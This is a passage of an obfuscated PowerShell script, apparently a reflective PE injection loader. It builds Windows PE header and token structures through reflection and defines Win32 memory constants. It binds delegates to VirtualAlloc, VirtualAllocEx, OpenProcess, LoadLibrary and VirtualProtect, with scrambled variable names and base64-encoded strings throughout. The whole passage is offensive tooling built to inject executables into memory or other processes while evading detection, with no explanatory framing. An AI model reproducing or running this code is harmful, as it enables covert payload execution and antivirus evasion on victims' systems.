		${__/===\/=\/\/=\/\} = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBDAG8AbgBzAHQA')))))
		${/=\___________/=\} = New-Object System.Reflection.Emit.CustomAttributeBuilder(${_/\/\/=\_/\/=\/==}, ${_/\/\/=\___/\/\__}, ${__/===\/=\/\/=\/\}, @([Int32] 4))
		${/=\___/\/=\_/\___}.SetCustomAttribute(${/=\___________/=\})
		${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAG8AZQBtAGkAZAA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAG8AZQBtAGkAbgBmAG8A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/\__/\__/\______} = ${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAHIAZQBzADIA'))), [UInt16[]], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALAAgAEgAYQBzAEYAaQBlAGwAZABNAGEAcgBzAGgAYQBsAA=='))))
		${_/\/\/=\___/\/\__} = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		${/=\___________/=\} = New-Object System.Reflection.Emit.CustomAttributeBuilder(${_/\/\/=\_/\/=\/==}, ${_/\/\/=\___/\/\__}, ${__/===\/=\/\/=\/\}, @([Int32] 10))
		${_/\__/\__/\______}.SetCustomAttribute(${/=\___________/=\})
		${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGwAZgBhAG4AZQB3AA=='))), [Int32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/==\______/\/\/\/} = ${_/===\/\/\_/==\__}.CreateType()	
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value ${/==\______/\/\/\/}
		${/====\/\/\_/===\/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${_/===\/\/\_/==\__} = ${_/==\/\_/\_/==\_/}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBFAEMAVABJAE8ATgBfAEgARQBBAEQARQBSAA=='))), ${/====\/\/\_/===\/}, [System.ValueType], 40)
		${___/=\_/\_/\/==\_} = ${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAG0AZQA='))), [Char[]], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALAAgAEgAYQBzAEYAaQBlAGwAZABNAGEAcgBzAGgAYQBsAA=='))))
		${_/\/\/=\___/\/\__} = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		${/=\___________/=\} = New-Object System.Reflection.Emit.CustomAttributeBuilder(${_/\/\/=\_/\/=\/==}, ${_/\/\/=\___/\/\__}, ${__/===\/=\/\/=\/\}, @([Int32] 8))
		${___/=\_/\_/\/==\_}.SetCustomAttribute(${/=\___________/=\})
		${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBpAHIAdAB1AGEAbABTAGkAegBlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBpAHIAdAB1AGEAbABBAGQAZAByAGUAcwBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAUgBhAHcARABhAHQAYQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUgBhAHcARABhAHQAYQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUgBlAGwAbwBjAGEAdABpAG8AbgBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8ATABpAG4AZQBuAHUAbQBiAGUAcgBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAFIAZQBsAG8AYwBhAHQAaQBvAG4AcwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAEwAaQBuAGUAbgB1AG0AYgBlAHIAcwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${__/==\/\_____/\_/} = ${_/===\/\/\_/==\__}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value ${__/==\/\_____/\_/}
		${/====\/\/\_/===\/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${_/===\/\/\_/==\__} = ${_/==\/\_/\_/==\_/}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AQgBBAFMARQBfAFIARQBMAE8AQwBBAFQASQBPAE4A'))), ${/====\/\/\_/===\/}, [System.ValueType], 8)
		${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBpAHIAdAB1AGEAbABBAGQAZAByAGUAcwBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAQgBsAG8AYwBrAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/==========\/=\__} = ${_/===\/\/\_/==\__}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value ${/==========\/=\__}
		${/====\/\/\_/===\/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${_/===\/\/\_/==\__} = ${_/==\/\_/\_/==\_/}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ASQBNAFAATwBSAFQAXwBEAEUAUwBDAFIASQBQAFQATwBSAA=='))), ${/====\/\/\_/===\/}, [System.ValueType], 20)
		${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAG0AZQBEAGEAdABlAFMAdABhAG0AcAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAdwBhAHIAZABlAHIAQwBoAGEAaQBuAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAG0AZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAHIAcwB0AFQAaAB1AG4AawA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/===\/\_/\_/\/=\_} = ${_/===\/\/\_/==\__}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value ${/===\/\_/\_/\/=\_}
		${/====\/\/\_/===\/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${_/===\/\/\_/==\__} = ${_/==\/\_/\_/==\_/}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARQBYAFAATwBSAFQAXwBEAEkAUgBFAEMAVABPAFIAWQA='))), ${/====\/\/\_/===\/}, [System.ValueType], 40)
		${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAG0AZQBEAGEAdABlAFMAdABhAG0AcAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAG0AZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAEYAdQBuAGMAdABpAG8AbgBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAE4AYQBtAGUAcwA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAGQAcgBlAHMAcwBPAGYARgB1AG4AYwB0AGkAbwBuAHMA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAGQAcgBlAHMAcwBPAGYATgBhAG0AZQBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAGQAcgBlAHMAcwBPAGYATgBhAG0AZQBPAHIAZABpAG4AYQBsAHMA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${__/====\_/====\_/} = ${_/===\/\/\_/==\__}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value ${__/====\_/====\_/}
		${/====\/\/\_/===\/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${_/===\/\/\_/==\__} = ${_/==\/\_/\_/==\_/}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABVAEkARAA='))), ${/====\/\/\_/===\/}, [System.ValueType], 8)
		${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAHcAUABhAHIAdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABpAGcAaABQAGEAcgB0AA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/==\/\___/=\/\_/} = ${_/===\/\/\_/==\__}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID -Value ${_/==\/\___/=\/\_/}
		${/====\/\/\_/===\/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${_/===\/\/\_/==\__} = ${_/==\/\_/\_/==\_/}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABVAEkARABfAEEATgBEAF8AQQBUAFQAUgBJAEIAVQBUAEUAUwA='))), ${/====\/\/\_/===\/}, [System.ValueType], 12)
		${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TAB1AGkAZAA='))), ${_/==\/\___/=\/\_/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB0AHQAcgBpAGIAdQB0AGUAcwA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/===\___/\/=\/\_} = ${_/===\/\/\_/==\__}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value ${_/===\___/\/=\/\_}
		${/====\/\/\_/===\/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${_/===\/\/\_/==\__} = ${_/==\/\_/\_/==\_/}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABPAEsARQBOAF8AUABSAEkAVgBJAEwARQBHAEUAUwA='))), ${/====\/\/\_/===\/}, [System.ValueType], 16)
		${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAdgBpAGwAZQBnAGUAQwBvAHUAbgB0AA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAdgBpAGwAZQBnAGUAcwA='))), ${_/===\___/\/=\/\_}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/=======\__/\/==\} = ${_/===\/\/\_/==\__}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value ${/=======\__/\/==\}
		return $Win32Types
	}
	Function __/\/==\____/=\/=\
	{
		$Win32Constants = New-Object System.Object
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
		$Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
		$Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0
		return $Win32Constants
	}
	Function __/\/\__/\/=\__/\_
	{
		$Win32Functions = New-Object System.Object
		${/=\_/\/\_/==\_/=\} = ______/\_/=\__/=== kernel32.dll VirtualAlloc
		${_/=\/\/\__/\_/\/\} = _/====\/==\______/ @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		${___/\/===\/\_/===} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${/=\_/\/\_/==\_/=\}, ${_/=\/\/\__/\_/\/\})
		$Win32Functions | Add-Member NoteProperty -Name VirtualAlloc -Value ${___/\/===\/\_/===}
		${___/\/=\/\/\_/\/\} = ______/\_/=\__/=== kernel32.dll VirtualAllocEx
		${/==\/\/=\____/\_/} = _/====\/==\______/ @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		${_/\__/\___/\_/==\} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${___/\/=\/\/\_/\/\}, ${/==\/\/=\____/\_/})
		$Win32Functions | Add-Member NoteProperty -Name VirtualAllocEx -Value ${_/\__/\___/\_/==\}
		${_/=\/\___/=\_/\/\} = ______/\_/=\__/=== msvcrt.dll memcpy
		${/=\_/\/\/=====\__} = _/====\/==\______/ @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
		${/=\_/\__/=\_/\/=\} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${_/=\/\___/=\_/\/\}, ${/=\_/\/\/=====\__})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name memcpy -Value ${/=\_/\__/=\_/\/=\}
		${__/==\___/=\__/\_} = ______/\_/=\__/=== msvcrt.dll memset
		${_/\/\/========\/\} = _/====\/==\______/ @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
		${__/=\/=\/\___/=\/} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${__/==\___/=\__/\_}, ${_/\/\/========\/\})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name memset -Value ${__/=\/=\/\___/=\/}
		${_/==\____/\__/\/\} = ______/\_/=\__/=== kernel32.dll LoadLibraryA
		${__/\_/\_/\/\_/=\_} = _/====\/==\______/ @([String]) ([IntPtr])
		${/===\/\/\_/\/\/==} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${_/==\____/\__/\/\}, ${__/\_/\_/\/\_/=\_})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value ${/===\/\/\_/\/\/==}
		${_/\__/==\/===\_/=} = ______/\_/=\__/=== kernel32.dll GetProcAddress
		${__/\_/\/\__/\_/==} = _/====\/==\______/ @([IntPtr], [String]) ([IntPtr])
		${_/\___/=\_/===\_/} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${_/\__/==\/===\_/=}, ${__/\_/\/\__/\_/==})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value ${_/\___/=\_/===\_/}
		${/=\/====\/\/\_/=\} = ______/\_/=\__/=== kernel32.dll GetProcAddress 
		${__/\__/\/=\/\/==\} = _/====\/==\______/ @([IntPtr], [IntPtr]) ([IntPtr])
		${___/\/====\___/\/} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${/=\/====\/\/\_/=\}, ${__/\__/\/=\/\/==\})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddressIntPtr -Value ${___/\/====\___/\/}
		${___/\__/==\_/=\/\} = ______/\_/=\__/=== kernel32.dll VirtualFree
		${_/\/==\/\/\/=\___} = _/====\/==\______/ @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
		${/=\/\__/==\__/=\/} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${___/\__/==\_/=\/\}, ${_/\/==\/\/\/=\___})
		$Win32Functions | Add-Member NoteProperty -Name VirtualFree -Value ${/=\/\__/==\__/=\/}
		${___/=======\_/=\_} = ______/\_/=\__/=== kernel32.dll VirtualFreeEx
		${_/\/=\/\/\/\_/\__} = _/====\/==\______/ @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
		${_/=\/\__/===\/=\_} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${___/=======\_/=\_}, ${_/\/=\/\/\/\_/\__})
		$Win32Functions | Add-Member NoteProperty -Name VirtualFreeEx -Value ${_/=\/\__/===\/=\_}
		${_____/===\/===\__} = ______/\_/=\__/=== kernel32.dll VirtualProtect
		${/==\/\/==\_/\__/=} = _/====\/==\______/ @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
		${/==\/=\_/==\/=\/=} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${_____/===\/===\__}, ${/==\/\/==\_/\__/=})
		$Win32Functions | Add-Member NoteProperty -Name VirtualProtect -Value ${/==\/=\_/==\/=\/=}
		${_____/==\/=\/\/\/} = ______/\_/=\__/=== kernel32.dll GetModuleHandleA
		${_/\_/===\/=\_/\__} = _/====\/==\______/ @([String]) ([IntPtr])
		${/=\/\/==\/\___/\/} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${_____/==\/=\/\/\/}, ${_/\_/===\/=\_/\__})
		$Win32Functions | Add-Member NoteProperty -Name GetModuleHandle -Value ${/=\/\/==\/\___/\/}
		${__/===\/======\/=} = ______/\_/=\__/=== kernel32.dll FreeLibrary
		${/==\/=\_/======\_} = _/====\/==\______/ @([IntPtr]) ([Bool])
		${___/====\________} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${__/===\/======\/=}, ${/==\/=\_/======\_})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value ${___/====\________}
		${_/===\_____/\_/=\} = ______/\_/=\__/=== kernel32.dll OpenProcess
	    ${__/\/=\/\__/=\___} = _/====\/==\______/ @([UInt32], [Bool], [UInt32]) ([IntPtr])
	    ${_/=\/\_____/===\_} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${_/===\_____/\_/=\}, ${__/\/=\/\__/=\___})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenProcess -Value ${_/=\/\_____/===\_}
		${__/\__/\/====\_/\} = ______/\_/=\__/=== kernel32.dll WaitForSingleObject
	    ${_/\/=\_/=\__/\/\_} = _/====\/==\______/ @([IntPtr], [UInt32]) ([UInt32])
	    ${_/=====\_/==\_/\_} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${__/\__/\/====\_/\}, ${_/\/=\_/=\__/\/\_})
